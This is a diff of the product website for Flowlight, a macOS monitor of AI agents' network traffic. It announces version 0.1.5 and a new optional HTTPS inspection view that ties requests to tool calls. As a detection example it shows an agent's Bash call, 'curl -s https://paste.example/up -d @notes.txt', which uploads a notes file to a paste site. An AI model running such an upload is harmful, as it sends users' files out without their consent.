@@ -60,7 +60,7 @@ Documentation
 
  Using Flowlight
 
- Everything from the first launch to tuning the agent rules. Flowlight 0.1.4, macOS 15 or later.
+ Everything from the first launch to tuning the agent rules. Flowlight 0.1.5, macOS 15 or later.
 
  On this page
  InstallFirst launchHostnames
@@ -260,13 +260,13 @@ Free · open source · macOS 15+
 
  Flowlight shows which app on your Mac talked to which domain, over which protocol, and how much it sent.
  It keeps a closer eye on AI agents, so an email, an SSH session or a 180 MB upload you never asked for
- doesn't go unnoticed.
+ doesn't go unnoticed. Turn on HTTPS inspection and you see the tool calls behind it, too.
 
  Download for macOS
 
  Star on GitHub
 
- v0.1.4macOS 15+UniversalGPL-3.0No telemetry
+ v0.1.5macOS 15+UniversalGPL-3.0No telemetry
 
  connectionslive
 
@@ -322,7 +322,7 @@ Free · open source · macOS 15+
 
  Inside the app
 
- Four views, one question each
+ Five views, one question each
 
  Live
 What's moving right now? Per-app rates, the last two minutes, the busiest destination.
@@ -339,6 +339,10 @@ Where did it all go? Second to year, grouped by app, destination or IP, with cha
  Alerts
 What looked wrong? Explainable, per-app alerts with the destination and the threshold.
 ⌘4
+
+ Inspect
+Optional. What did the agent actually send, and which tool call made it? Decrypted requests, tool calls, results.
+⌘5
 
  Capture
 
@@ -389,7 +393,7 @@ What looked wrong? Explainable, per-app alerts with the destination and the thre
  ⌕ Opt-in
  Tool calls, from the model's own responses
 
- Turn on HTTPS inspection and Flowlight reads every tool call the model asks an agent to run, then ties each tool's request back to the call that caused it.
+ Turn on HTTPS inspection and Flowlight reads every tool call the model asks an agent to run and the result that came back, then ties each tool's request back to the call that caused it.
 
  curl → paste.example:443  ←  Bash: curl -s https://paste.example/up -d @notes.txt
 
@@ -503,6 +507,8 @@ e.g. Wireshark
 
  Rules for AI agentsYesNoNoNo
 
+ An agent's tool calls, tied to its trafficYes, opt-inNoNoNo
+
  Blocks connectionsNo, observe onlyNoYesNo
 
  Free and open sourceYes, GPL-3.0Built inVariesYes
@@ -520,6 +526,25 @@ e.g. Wireshark
 
  Read the full story →
 
+ HTTPS inspection · optional
+
+ See the tool call behind every request
+
+ Off by default. Turn it on and Flowlight becomes a local proxy with its own certificate authority, created on your
+ Mac. Start an agent from an inspected Terminal and every request it and its tools make is decrypted, with the tool calls the
+ model asked for and the results that went back.
+
+ Where did my notes go? curl's upload to paste.example, traced to the Bash command the model asked for, with the
+ body it sent.
+
+ Tool calls and resultsAnthropic, OpenAI, Gemini and MCP. Each call with its command, its output or error, and the requests its tool made.
+
+ MCP serversName, version, local or remote, the tools each one offers, and how often they were called or failed.
+
+ Readable bodiesJSON as a collapsible tree in its original order, streams one event at a time, headers and raw view.
+
+ On your termsAI agents only by default. Apple services and password managers are never decrypted, credentials never stored, and one button removes it all.
+
  Privacy
 
  A monitor you don't have to monitor
@@ -532,8 +557,9 @@ e.g. Wireshark
 
  Lookups you controlNaming who owns an address sends only public IPs with no hostname to Team Cymru, and turns off in one click. The daily update check only asks GitHub for the latest version, and can be turned off too.
 
- One agent, all its tools. Traffic from the git, curl and MCP servers Claude Code started is counted as Claude Code's,
- labelled via curl or via github MCP. With an allowlist of GitHub and npm, the SMTP relay and the paste site stand out as Not allowed.
+ One agent, every tool call. Traffic from the git, curl and MCP servers Claude Code started counts as Claude Code's.
+ With HTTPS inspection on, the Tool calls tab shows what the model asked for, what came back, and the requests each tool made:
+ the curl upload to paste.example, and the git push that failed.
 
  Reports. Second-to-year zoom, three groupings, charts that stay readable with hundreds of apps.
 
@@ -720,8 +746,8 @@ Releases
 
  Downloads, checksums and full notes for each version are on GitHub Releases.
 
- Next release
-In development
+ 0.1.5
+September 22, 2026Latest
 
  Tool results and MCP servers. With HTTPS inspection on, each tool call shows what came back (output or error),
  and each agent's detail gets Tool calls and MCP servers tabs: server name and version, the tools it offers, calls
@@ -734,8 +760,10 @@ In development
 
  Fixed: nettop sometimes hangs; Flowlight now restarts a stuck sample after 5 seconds instead of stopping capture.
 
+ Downloads and checksums →
+
  0.1.4
-September 22, 2026Latest
+September 22, 2026
 
  HTTPS inspection (optional, off by default). A local proxy with a certificate authority created on your Mac decrypts
  the apps you route through it: AI agents and their tools by default. See every request and response in the new Inspect view.
